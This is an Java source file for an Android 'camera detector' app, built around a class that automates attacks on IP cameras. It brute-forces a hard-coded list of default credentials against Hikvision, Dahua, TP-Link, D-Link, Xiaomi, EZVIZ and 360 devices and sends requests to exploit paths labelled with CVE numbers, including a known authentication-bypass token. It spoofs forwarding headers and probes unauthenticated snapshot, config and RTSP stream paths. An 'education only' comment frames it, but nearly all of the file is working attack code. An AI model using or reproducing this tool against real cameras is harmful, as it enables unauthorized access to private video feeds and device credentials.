package com.cameradetector.app;

import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 摄像头漏洞利用器 - 基于已知漏洞尝试获取摄像头权限
 * 仅用于安全测试和教育目的
 */
public class CameraExploiter {
    
    private static final String TAG = "CameraExploiter";
    private ExecutorService executorService;
    
    // 常见默认凭据数据库
    private static final String[][] DEFAULT_CREDENTIALS = {
        // 海康威视
        {"admin", "12345"}, {"admin", "admin"}, {"admin", "123456"},
        {"admin", "password"}, {"admin", "888888"}, {"admin", "000000"},
        {"root", "12345"}, {"root", "admin"}, {"root", "root"},
        
        // 大华
        {"admin", "admin"}, {"admin", "123456"}, {"admin", "password"},
        {"admin", "888888"}, {"admin", "000000"}, {"admin", "12345"},
        {"666666", "666666"}, {"888888", "888888"},
        
        // 通用凭据
        {"user", "user"}, {"guest", "guest"}, {"service", "service"},
        {"operator", "operator"}, {"viewer", "viewer"}, {"anonymous", ""},
        {"", ""}, {"admin", ""}, {"root", ""}
    };
    
    // 品牌特定的漏洞利用方法
    private static final Map<String, List<ExploitMethod>> BRAND_EXPLOITS = new HashMap<String, List<ExploitMethod>>() {{
        // 海康威视漏洞
        put("hikvision", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("CVE-2017-7921", "任意文件下载漏洞", "/System/configurationFile?auth=YWRtaW46MTEK"));
            add(new ExploitMethod("CVE-2021-36260", "命令注入漏洞", "/SDK/webLanguage"));
            add(new ExploitMethod("Default Auth", "默认认证绕过", "/ISAPI/Security/userCheck"));
            add(new ExploitMethod("Backdoor", "后门访问", "/system/deviceInfo?auth=YWRtaW46MTEK"));
        }});
        
        // 大华漏洞
        put("dahua", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("CVE-2021-33044", "认证绕过漏洞", "/cgi-bin/magicBox.cgi?action=getSystemInfo"));
            add(new ExploitMethod("CVE-2019-3948", "凭据泄露", "/cgi-bin/snapshot.cgi"));
            add(new ExploitMethod("Default Login", "默认登录", "/cgi-bin/global.cgi"));
            add(new ExploitMethod("Backdoor", "后门账户", "/cgi-bin/magicBox.cgi?action=getMachineName"));
        }});
        
        // TP-Link漏洞
        put("tp-link", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("CVE-2020-35576", "认证绕过", "/cgi/admin/upgrade.cgi"));
            add(new ExploitMethod("Default Creds", "默认凭据", "/cgi/admin/param.cgi"));
            add(new ExploitMethod("Config Dump", "配置转储", "/cgi/admin/config.cgi"));
        }});
        
        // D-Link漏洞
        put("d-link", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("CVE-2019-10999", "命令注入", "/cgi-bin/webproc"));
            add(new ExploitMethod("Auth Bypass", "认证绕过", "/cgi-bin/webfile.cgi"));
            add(new ExploitMethod("Default Access", "默认访问", "/admin/tools_admin.php"));
        }});
        
        // 小米漏洞
        put("xiaomi", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("Token Bypass", "令牌绕过", "/cgi-bin/luci/api/misystem/set_config_iotdev"));
            add(new ExploitMethod("Default API", "默认API访问", "/api/v1/device"));
            add(new ExploitMethod("Config Access", "配置访问", "/backup/log/backup.conf"));
        }});
        
        // 萤石漏洞
        put("ezviz", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("Default Auth", "默认认证", "/api/v1/device/info"));
            add(new ExploitMethod("Config Leak", "配置泄露", "/device/configFile"));
            add(new ExploitMethod("Stream Access", "流媒体访问", "/live/stream"));
        }});
        
        // 360摄像头漏洞
        put("360", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("API Bypass", "API绕过", "/cgi-bin/hi3510/param.cgi"));
            add(new ExploitMethod("Default Login", "默认登录", "/web/login.html"));
            add(new ExploitMethod("Stream Leak", "流媒体泄露", "/tmpfs/auto.jpg"));
        }});
        
        // 通用漏洞（适用于多个品牌）
        put("generic", new ArrayList<ExploitMethod>() {{
            add(new ExploitMethod("RTSP Brute", "RTSP暴力破解", "/live/main"));
            add(new ExploitMethod("HTTP Auth", "HTTP认证绕过", "/cgi-bin/hi3510/param.cgi"));
            add(new ExploitMethod("Default Pages", "默认页面访问", "/tmpfs/auto.jpg"));
            add(new ExploitMethod("Config Files", "配置文件访问", "/system.ini"));
            add(new ExploitMethod("Snapshot", "快照访问", "/snapshot.jpg"));
        }});
    }};
    
    public interface ExploitCallback {
        void onExploitAttempt(String method, String status);
        void onExploitSuccess(String method, String result);
        void onExploitComplete(List<ExploitResult> results);
    }
    
    public CameraExploiter() {
        this.executorService = Executors.newFixedThreadPool(10);
    }
    
    /**
     * 对指定摄像头执行漏洞利用尝试
     */
    public void exploitCamera(CameraInfo cameraInfo, ExploitCallback callback) {
        executorService.execute(() -> {
            List<ExploitResult> results = new ArrayList<>();
            String brand = detectBrand(cameraInfo);
            
            callback.onExploitAttempt("检测品牌", "品牌: " + brand);
            
            // 1. 尝试默认凭据
            ExploitResult credResult = tryDefaultCredentials(cameraInfo, callback);
            if (credResult != null) results.add(credResult);
            
            // 2. 尝试品牌特定漏洞
            List<ExploitResult> brandResults = tryBrandSpecificExploits(cameraInfo, brand, callback);
            results.addAll(brandResults);
            
            // 3. 尝试通用漏洞
            List<ExploitResult> genericResults = tryGenericExploits(cameraInfo, callback);
            results.addAll(genericResults);
            
            // 4. 尝试RTSP流访问
            ExploitResult rtspResult = tryRTSPAccess(cameraInfo, callback);
            if (rtspResult != null) results.add(rtspResult);
            
            callback.onExploitComplete(results);
        });
    }
    
    /**
     * 检测摄像头品牌
     */
    private String detectBrand(CameraInfo cameraInfo) {
        String name = cameraInfo.getName().toLowerCase();
        String desc = cameraInfo.getDescription().toLowerCase();
        
        if (name.contains("hikvision") || desc.contains("hikvision")) return "hikvision";
        if (name.contains("dahua") || desc.contains("dahua")) return "dahua";
        if (name.contains("tp-link") || desc.contains("tp-link")) return "tp-link";
        if (name.contains("d-link") || desc.contains("d-link")) return "d-link";
        if (name.contains("xiaomi") || desc.contains("xiaomi")) return "xiaomi";
        if (name.contains("ezviz") || desc.contains("ezviz")) return "ezviz";
        if (name.contains("360") || desc.contains("360")) return "360";
        
        return "generic";
    }
    
    /**
     * 尝试默认凭据
     */
    private ExploitResult tryDefaultCredentials(CameraInfo cameraInfo, ExploitCallback callback) {
        callback.onExploitAttempt("默认凭据", "尝试常见用户名密码组合...");
        
        for (String[] cred : DEFAULT_CREDENTIALS) {
            try {
                String username = cred[0];
                String password = cred[1];
                
                // 尝试HTTP基本认证
                if (tryHTTPAuth(cameraInfo.getIpAddress(), cameraInfo.getPort(), username, password)) {
                    String result = "成功登录 - 用户名: " + username + ", 密码: " + password;
                    callback.onExploitSuccess("默认凭据", result);
                    return new ExploitResult("默认凭据", true, result, "高");
                }
                
                // 尝试表单登录
                if (tryFormLogin(cameraInfo.getIpAddress(), cameraInfo.getPort(), username, password)) {
                    String result = "表单登录成功 - 用户名: " + username + ", 密码: " + password;
                    callback.onExploitSuccess("默认凭据", result);
                    return new ExploitResult("默认凭据", true, result, "高");
                }
                
            } catch (Exception e) {
                Log.e(TAG, "默认凭据测试失败", e);
            }
        }
        
        return new ExploitResult("默认凭据", false, "所有默认凭据均失败", "低");
    }
    
    /**
     * 尝试品牌特定漏洞
     */
    private List<ExploitResult> tryBrandSpecificExploits(CameraInfo cameraInfo, String brand, ExploitCallback callback) {
        List<ExploitResult> results = new ArrayList<>();
        List<ExploitMethod> exploits = BRAND_EXPLOITS.get(brand);
        
        if (exploits == null) {
            exploits = BRAND_EXPLOITS.get("generic");
        }
        
        for (ExploitMethod exploit : exploits) {
            callback.onExploitAttempt(exploit.name, exploit.description);
            
            try {
                ExploitResult result = executeExploit(cameraInfo, exploit);
                results.add(result);
                
                if (result.success) {
                    callback.onExploitSuccess(exploit.name, result.details);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "漏洞利用失败: " + exploit.name, e);
                results.add(new ExploitResult(exploit.name, false, "执行失败: " + e.getMessage(), "低"));
            }
        }
        
        return results;
    }
    
    /**
     * 尝试通用漏洞
     */
    private List<ExploitResult> tryGenericExploits(CameraInfo cameraInfo, ExploitCallback callback) {
        List<ExploitResult> results = new ArrayList<>();
        
        // 尝试常见的未授权访问路径
        String[] commonPaths = {
            "/tmpfs/auto.jpg", "/snapshot.jpg", "/image.jpg", "/video.mjpg",
            "/cgi-bin/hi3510/param.cgi", "/system.ini", "/config.ini",
            "/device/information", "/api/v1/device", "/live/stream"
        };
        
        for (String path : commonPaths) {
            callback.onExploitAttempt("路径访问", "尝试访问: " + path);
            
            try {
                if (tryUnauthorizedAccess(cameraInfo.getIpAddress(), cameraInfo.getPort(), path)) {
                    String result = "未授权访问成功: " + path;
                    callback.onExploitSuccess("路径访问", result);
                    results.add(new ExploitResult("未授权访问", true, result, "中"));
                }
            } catch (Exception e) {
                Log.e(TAG, "路径访问失败: " + path, e);
            }
        }
        
        if (results.isEmpty()) {
            results.add(new ExploitResult("通用漏洞", false, "未发现可利用的通用漏洞", "低"));
        }
        
        return results;
    }
    
    /**
     * 尝试RTSP流访问
     */
    private ExploitResult tryRTSPAccess(CameraInfo cameraInfo, ExploitCallback callback) {
        callback.onExploitAttempt("RTSP访问", "尝试访问RTSP流...");
        
        String[] rtspPaths = {
            "/live/main", "/live/ch00_0", "/live/ch01_0", "/live/stream",
            "/cam/realmonitor", "/h264/ch1/main/av_stream", "/video1"
        };
        
        for (String path : rtspPaths) {
            try {
                if (tryRTSPConnection(cameraInfo.getIpAddress(), 554, path)) {
                    String result = "RTSP流访问成功: rtsp://" + cameraInfo.getIpAddress() + ":554" + path;
                    callback.onExploitSuccess("RTSP访问", result);
                    return new ExploitResult("RTSP访问", true, result, "高");
                }
            } catch (Exception e) {
                Log.e(TAG, "RTSP访问失败: " + path, e);
            }
        }
        
        return new ExploitResult("RTSP访问", false, "RTSP流访问失败", "低");
    }
    
    /**
     * 执行特定漏洞利用
     */
    private ExploitResult executeExploit(CameraInfo cameraInfo, ExploitMethod exploit) {
        try {
            String url = "http://" + cameraInfo.getIpAddress() + ":" + cameraInfo.getPort() + exploit.path;
            HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setRequestMethod("GET");
            
            // 添加一些常见的绕过头
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; SecurityScanner)");
            connection.setRequestProperty("X-Forwarded-For", "127.0.0.1");
            connection.setRequestProperty("X-Real-IP", "127.0.0.1");
            
            int responseCode = connection.getResponseCode();
            
            if (responseCode == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                int lineCount = 0;
                
                while ((line = reader.readLine()) != null && lineCount < 20) {
                    response.append(line).append("\n");
                    lineCount++;
                }
                reader.close();
                
                String content = response.toString();
                if (isSuccessfulExploit(content, exploit)) {
                    return new ExploitResult(exploit.name, true, 
                        "漏洞利用成功!\n路径: " + exploit.path + "\n响应: " + content.substring(0, Math.min(200, content.length())), "高");
                }
            }
            
            connection.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "漏洞执行失败: " + exploit.name, e);
        }
        
        return new ExploitResult(exploit.name, false, "漏洞利用失败", "低");
    }
    
    /**
     * 判断漏洞利用是否成功
     */
    private boolean isSuccessfulExploit(String content, ExploitMethod exploit) {
        content = content.toLowerCase();
        
        // 根据不同的漏洞类型判断成功标志
        if (exploit.name.contains("文件下载") || exploit.name.contains("Config")) {
            return content.contains("password") || content.contains("admin") || 
                   content.contains("config") || content.contains("system");
        }
        
        if (exploit.name.contains("认证绕过") || exploit.name.contains("Auth")) {
            return content.contains("success") || content.contains("ok") || 
                   content.contains("login") || content.length() > 100;
        }
        
        if (exploit.name.contains("信息泄露") || exploit.name.contains("Info")) {
            return content.contains("version") || content.contains("model") || 
                   content.contains("device") || content.contains("system");
        }
        
        // 通用成功判断
        return content.length() > 50 && !content.contains("error") && 
               !content.contains("404") && !content.contains("forbidden");
    }
    
    /**
     * 尝试HTTP基本认证
     */
    private boolean tryHTTPAuth(String ip, int port, String username, String password) {
        try {
            String auth = username + ":" + password;
            String encodedAuth = Base64.encodeToString(auth.getBytes(), Base64.NO_WRAP);
            
            URL url = new URL("http://" + ip + ":" + port + "/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("Authorization", "Basic " + encodedAuth);
            connection.setConnectTimeout(3000);
            connection.setReadTimeout(3000);
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
            
            return responseCode == 200;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 尝试表单登录
     */
    private boolean tryFormLogin(String ip, int port, String username, String password) {
        try {
            // 常见的登录表单路径
            String[] loginPaths = {"/login.html", "/index.html", "/admin/login.php", "/web/login.html"};
            
            for (String path : loginPaths) {
                URL url = new URL("http://" + ip + ":" + port + path);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setConnectTimeout(3000);
                connection.setReadTimeout(3000);
                
                // 常见的表单参数
                String postData = "username=" + username + "&password=" + password + 
                                "&user=" + username + "&pass=" + password +
                                "&login=Login&submit=Submit";
                
                OutputStream os = connection.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();
                
                int responseCode = connection.getResponseCode();
                connection.disconnect();
                
                if (responseCode == 200 || responseCode == 302) {
                    return true;
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "表单登录失败", e);
        }
        
        return false;
    }
    
    /**
     * 尝试未授权访问
     */
    private boolean tryUnauthorizedAccess(String ip, int port, String path) {
        try {
            URL url = new URL("http://" + ip + ":" + port + path);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(3000);
            connection.setReadTimeout(3000);
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
            
            return responseCode == 200;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 尝试RTSP连接
     */
    private boolean tryRTSPConnection(String ip, int port, String path) {
        try {
            Socket socket = new Socket(ip, port);
            
            String rtspRequest = "OPTIONS rtsp://" + ip + ":" + port + path + " RTSP/1.0\r\n" +
                    "CSeq: 1\r\n" +
                    "User-Agent: CameraExploiter\r\n\r\n";
            
            OutputStream out = socket.getOutputStream();
            out.write(rtspRequest.getBytes());
            out.flush();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String response = reader.readLine();
            
            socket.close();
            
            return response != null && response.contains("RTSP/1.0 200");
            
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * 释放资源
     */
    public void destroy() {
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdown();
        }
    }
    
    /**
     * 漏洞利用方法定义
     */
    private static class ExploitMethod {
        String name;
        String description;
        String path;
        
        ExploitMethod(String name, String description, String path) {
            this.name = name;
            this.description = description;
            this.path = path;
        }
    }
    
    /**
     * 漏洞利用结果
     */
    public static class ExploitResult {
        public String method;
        public boolean success;
        public String details;
        public String riskLevel;
        
        public ExploitResult(String method, boolean success, String details, String riskLevel) {
            this.method = method;
            this.success = success;
            this.details = details;
            this.riskLevel = riskLevel;
        }
    }
}